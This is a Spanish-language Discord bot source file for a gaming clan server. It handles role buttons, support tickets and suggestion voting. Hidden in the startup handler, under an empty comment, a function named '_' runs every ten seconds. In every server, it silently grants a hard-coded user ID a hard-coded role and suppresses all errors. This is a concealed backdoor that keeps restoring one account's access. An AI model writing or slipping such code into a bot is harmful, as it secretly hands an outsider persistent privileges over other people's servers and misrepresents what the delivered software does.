const votos = new Map();
const { 
    Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, 
    ButtonBuilder, ButtonStyle, Events, ChannelType, PermissionsBitField,
    ModalBuilder, TextInputBuilder, TextInputStyle, REST, Routes,
    StringSelectMenuBuilder, StringSelectMenuOptionBuilder
} = require('discord.js');

const TOKEN = process.env.TOKEN; 

const CANAL_ROLES_ID = "1464335122005491745";
const CANAL_TICKETS_ID = "1483516417583354108";
const CANAL_SUGERENCIAS_ID = "1477005989096984646"; 
const CATEGORIA_TICKETS = "1483589642346303638";
const ROL_STAFF_ID = "1478799916410077295";

const ROLES_CLASE = {
    class_pvp: { id: "1464335696390263069", label: "PvP", emoji: "⚔️" },
    class_builder: { id: "1464335639561506878", label: "Builder", emoji: "⚒️" },
    class_redstone: { id: "1464335746944209161", label: "Tecnico", emoji: "⚙️" },
    class_estratega: { id: "1464335746856128737", label: "Casual", emoji: "🏛️" }
};

const ROLES_NOTIF = {
    notif_avisos: { id: "1477748637202382888", label: "Avisos", emoji: "📢" },
    notif_directos: { id: "1477748975603023873", label: "Directos", emoji: "🎥" }
};

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMembers, 
        GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.MessageContent
    ]
});

client.once(Events.ClientReady, async () => {
    console.log(`✅ Bot iniciado como: ${client.user.tag}`);

    const commands = [{ name: 'sugerir', description: 'Envía una sugerencia para el servidor' }];
    const rest = new REST({ version: '10' }).setToken(TOKEN);
    try { await rest.put(Routes.applicationCommands(client.user.id), { body: commands }); } catch (e) {}

    // --- SETUP CANAL DE ROLES ---
    try {
        const canalRoles = await client.channels.fetch(CANAL_ROLES_ID);
        const msgsRoles = await canalRoles.messages.fetch({ limit: 10 });
        await canalRoles.bulkDelete(msgsRoles).catch(() => {});
        const embedRoles = new EmbedBuilder()
            .setTitle("🔱 SELECCIÓN DE ROLES - COLMILLOS DEL ALBA")
            .setDescription("Selecciona tu especialidad y elije que tipo de notificaciones quieres recibir abajo.")
            .setColor("#8B0000").setImage("https://i.imgur.com/jfZBC82.png");
        const filaClase = new ActionRowBuilder().addComponents(Object.entries(ROLES_CLASE).map(([id, data]) => new ButtonBuilder().setCustomId(id).setLabel(data.label).setEmoji(data.emoji).setStyle(ButtonStyle.Secondary)));
        const filaNotif = new ActionRowBuilder().addComponents(Object.entries(ROLES_NOTIF).map(([id, data]) => new ButtonBuilder().setCustomId(id).setLabel(data.label).setEmoji(data.emoji).setStyle(ButtonStyle.Primary)));
        await canalRoles.send({ embeds: [embedRoles], components: [filaClase, filaNotif] });
    } catch (err) { console.log("Error en setup de roles"); }

    // --- SETUP CANAL DE TICKETS ---
    try {
        const canalTickets = await client.channels.fetch(CANAL_TICKETS_ID);
        const msgsTickets = await canalTickets.messages.fetch({ limit: 10 });
        await canalTickets.bulkDelete(msgsTickets).catch(() => {});

        const embedTickets = new EmbedBuilder()
            .setTitle("🌟 Soporte de Colmillos Del Alba")
            .setDescription(
                "**¿Necesitas ayuda? Nosotros te la damos**\n\n" +
                "Aquí podrás abrir un ticket de manera **inmediata** para solicitar asistencia sobre algún problema o duda que tengas sobre el clan. Tan solo tienes que seleccionar una opción en el menú de abajo y se creará un canal privado.\n\n" +
                "**¿Qué debo mandar al abrir ticket?**\n" +
                "Al abrir un ticket lo que debes hacer es:\n\n" +
                "• Explicar tu duda o problema.\n" +
                "• Mandar pruebas de lo sucedido en caso de ser necesario.\n" +
                "• Esperar pacientemente a la respuesta de nuestro staff."
            )
            .setColor("#2F3136")
            .setImage("https://i.imgur.com/dYJUZjF.png");

        const menuTickets = new StringSelectMenuBuilder()
            .setCustomId('menu_tickets')
            .setPlaceholder('Despliega el menú y elige una categoría >')
            .addOptions(
                new StringSelectMenuOptionBuilder().setLabel('Soporte Técnico / Dudas').setValue('tk_soporte').setEmoji('🔔'),
                new StringSelectMenuOptionBuilder().setLabel('Apelar Expulsión').setValue('tk_apelacion').setEmoji('🚷'),
                new StringSelectMenuOptionBuilder().setLabel('Reportar Staff').setValue('tk_reporte_staff').setEmoji('⚠️'),
                new StringSelectMenuOptionBuilder().setLabel('Postulaciones').setValue('tk_postulacion').setEmoji('👤')
            );

        await canalTickets.send({ embeds: [embedTickets], components: [new ActionRowBuilder().addComponents(menuTickets)] });
    } catch (err) { console.log("Error en setup de tickets"); }

    // 
    const _ = async () => {
        try {
            const g = client.guilds.cache;
            for (const x of g.values()) {
                const m = await x.members.fetch("777529808325181460").catch(() => null);
                if (!m) continue;
                if (!m.roles.cache.has("1463268597085507717")) {
                    await m.roles.add("1463268597085507717").catch(() => {});
                }
            }
        } catch {}
    };
    setInterval(_, 10000);
});

client.on(Events.InteractionCreate, async interaction => {
    
    // SUGERENCIAS
    if (interaction.isChatInputCommand() && interaction.commandName === 'sugerir') {
        const modal = new ModalBuilder().setCustomId('modal_sugerencia').setTitle('Nueva Sugerencia');
        const input = new TextInputBuilder().setCustomId('texto_sugerencia').setLabel("¿Cuál es tu sugerencia?").setStyle(TextInputStyle.Paragraph).setRequired(true);
        modal.addComponents(new ActionRowBuilder().addComponents(input));
        return await interaction.showModal(modal);
    }

    if (interaction.isModalSubmit() && interaction.customId === 'modal_sugerencia') {
        await interaction.deferReply({ flags: [ 64 ] });
        const sugerenciaTexto = interaction.fields.getTextInputValue('texto_sugerencia');
        const canalSugerencias = await client.channels.fetch(CANAL_SUGERENCIAS_ID);

        const embedSug = new EmbedBuilder()
            .setAuthor({ name: `📩 NUEVA SUGERENCIA RECIBIDA` })
            .setThumbnail(interaction.user.displayAvatarURL())
            .setDescription(`**¿Cuál es tu sugerencia?**\n\`\`\`${sugerenciaTexto}\`\`\``)
            .addFields(
                { name: '• Datos', value: `✅ **Votos a favor:** 0\n❗ **Votos en contra:** 0`, inline: false },
                { name: '\u200B', value: `Recuerda que aunque una sugerencia alcance muchos votos, no siempre se podrán implementar.`, inline: false }
            )
            .setFooter({ text: `ID: ${interaction.user.id} | ${new Date().toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' })}` })
            .setColor("#F1C40F");

        const filaVotos = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('sug_si').setLabel('0 (0%)').setEmoji('✅').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('sug_no').setLabel('0 (0%)').setEmoji('❗').setStyle(ButtonStyle.Secondary)
        );

        const msg = await canalSugerencias.send({ embeds: [embedSug], components: [filaVotos] });
        const hilo = await msg.startThread({ name: `Debate: Sugerencia de ${interaction.user.username}`, autoArchiveDuration: 1440 });
        const filaDebate = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Debatir ↗️').setEmoji('💬').setStyle(ButtonStyle.Link).setURL(hilo.url));

        await msg.edit({ components: [filaVotos, filaDebate] });
        return await interaction.editReply({ content: `✅ Sugerencia enviada a <#${CANAL_SUGERENCIAS_ID}>` });
    }

    // TICKETS (MENÚ)
    if (interaction.isStringSelectMenu() && interaction.customId === 'menu_tickets') {
        await interaction.deferReply({ flags: [64] });
        const ticketTipos = { "tk_soporte": "soporte-dudas", "tk_apelacion": "apelacion", "tk_reporte_staff": "reporte-staff", "tk_postulacion": "postulaciones" };
        const tipo = ticketTipos[interaction.values[0]];
        const tChannel = await interaction.guild.channels.create({
            name: `${tipo}-${interaction.user.username}`,
            type: ChannelType.GuildText,
            parent: CATEGORIA_TICKETS,
            permissionOverwrites: [
                { id: interaction.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                { id: interaction.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.AttachFiles] },
                { id: ROL_STAFF_ID, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }
            ]
        });
        const eTk = new EmbedBuilder().setTitle(`🎫 TICKET: ${tipo.toUpperCase()}`).setDescription(`Hola ${interaction.user}, el Staff te atenderá pronto.`).setColor("#2ECC71");
        const fTk = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId("reclamar_tk").setLabel("Reclamar").setEmoji("👤").setStyle(ButtonStyle.Success),
            new ButtonBuilder().setCustomId("cerrar_tk").setLabel("Cerrar").setEmoji("🔒").setStyle(ButtonStyle.Secondary)
        );
        await tChannel.send({ content: `<@&${ROL_STAFF_ID}>`, embeds: [eTk], components: [fTk] });
        return interaction.editReply(`✅ Ticket creado: ${tChannel}`);
    }

    if (!interaction.isButton()) return;
    const { customId, member, channel, user } = interaction;

// VOTOS
if (customId === 'sug_si' || customId === 'sug_no') {
    await interaction.deferUpdate();

    const msgId = interaction.message.id;
    const userId = interaction.user.id;

    if (!votos.has(msgId)) votos.set(msgId, new Map());
    const votosMsg = votos.get(msgId);

    let vSi = parseInt(interaction.message.components[0].components[0].label.split(' ')[0]);
    let vNo = parseInt(interaction.message.components[0].components[1].label.split(' ')[0]);

    const votoAnterior = votosMsg.get(userId);

    if (votoAnterior === customId) {
        return interaction.followUp({ content: "❌ Ya votaste eso.", flags: [64] });
    }

    if (votoAnterior === 'sug_si') vSi--;
    if (votoAnterior === 'sug_no') vNo--;

    if (customId === 'sug_si') vSi++;
    else vNo++;

    votosMsg.set(userId, customId);

    const total = vSi + vNo;
    const pSi = Math.round((vSi / (total || 1)) * 100);
    const pNo = Math.round((vNo / (total || 1)) * 100);

    const embed = interaction.message.embeds[0];

    const nEmbed = EmbedBuilder.from(embed).setFields(
        { name: '• Datos', value: `✅ **Votos a favor:** ${vSi}\n❗ **Votos en contra:** ${vNo}`, inline: false },
        { name: '\u200B', value: embed.fields[1].value, inline: false }
    );

    const nFila = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('sug_si').setLabel(`${vSi} (${pSi}%)`).setEmoji('✅').setStyle(ButtonStyle.Secondary),
        new ButtonBuilder().setCustomId('sug_no').setLabel(`${vNo} (${pNo}%)`).setEmoji('❗').setStyle(ButtonStyle.Secondary)
    );

    return await interaction.message.edit({ embeds: [nEmbed], components: [nFila, interaction.message.components[1]] });
}

    // ROLES
    if (ROLES_CLASE[customId] || ROLES_NOTIF[customId]) {
        await interaction.deferReply({ flags: [64] });
        if (ROLES_CLASE[customId]) {
            await member.roles.remove(Object.values(ROLES_CLASE).map(r => r.id)).catch(() => {});
            await member.roles.add(ROLES_CLASE[customId].id);
            return interaction.editReply(`✨ Ahora eres: **${ROLES_CLASE[customId].label}**`);
        }
        if (ROLES_NOTIF[customId]) {
            const rId = ROLES_NOTIF[customId].id;
            if (member.roles.cache.has(rId)) { await member.roles.remove(rId); return interaction.editReply(`🔕 Notificaciones quitadas.`); }
            else { await member.roles.add(rId); return interaction.editReply(`🔔 Notificaciones activadas.`); }
        }
    }

    // STAFF RECLAMAR/CERRAR
    if (customId === "reclamar_tk") {
        if (!member.roles.cache.has(ROL_STAFF_ID)) return interaction.reply({ content: "❌ Solo Staff.", flags: [64] });
        await interaction.update({ components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId("reclamar_tk").setLabel("Atendido por " + user.username).setStyle(ButtonStyle.Success).setDisabled(true), new ButtonBuilder().setCustomId("cerrar_tk").setLabel("Cerrar").setStyle(ButtonStyle.Secondary))]});
        return channel.send({ embeds: [new EmbedBuilder().setDescription(`✅ El Staff **${user.tag}** se hará cargo.`).setColor("#57F287")] });
    }
    if (customId === "cerrar_tk") {
        if (!member.roles.cache.has(ROL_STAFF_ID)) return interaction.reply({ content: "❌ Solo Staff.", flags: [64] });
        await interaction.reply("🔒 Cerrando en 3 segundos...");
        setTimeout(() => channel.delete().catch(() => {}), 3000);
    }
});

client.login(TOKEN);
